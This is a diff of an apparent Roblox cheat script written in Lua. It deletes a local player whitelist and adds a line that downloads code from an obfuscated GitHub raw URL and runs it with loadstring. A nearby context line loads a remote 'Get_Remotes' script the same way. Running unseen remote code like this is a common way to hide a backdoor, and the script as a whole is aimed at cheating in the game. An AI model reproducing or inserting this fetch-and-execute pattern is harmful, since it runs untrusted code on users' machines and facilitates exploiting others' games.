@@ -1,14 +1,5 @@
--- Whitelist table
-local whitelist = {
-    [7054982083] = true,
-    [7074482563] = true,
-}
 
--- Function to check if a player is whitelisted
-local function isWhitelisted(player)
-    return whitelist[player.UserId]
-end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XFeastXl/SosjriJj-wkK-3-1736-akwkLalqkwjz/main/DjejchBsudbzbu7wejj%2B2(2%2B%24*2(3%23%3B%24%3B%24%23(2("))()
 if isWhitelisted(game.Players.LocalPlayer) then
 
 -- Create a GUI with a large frame in the middle of the screen
@@ -356,7 +347,6 @@ Button5.MouseButton1Click:Connect(function()
     if isWhitelisted(game.Players.LocalPlayer) then    
                 -- Load the remote
 loadstring(game:HttpGet("https://raw.githubusercontent.com/qxkya/Kya-Ware/main/Get_Remotes"))()
-
 -- Create a function to get the closest player within a 18 stud radius
 local function getClosestPlayer()
     local players = game:GetService("Players"):GetPlayers()
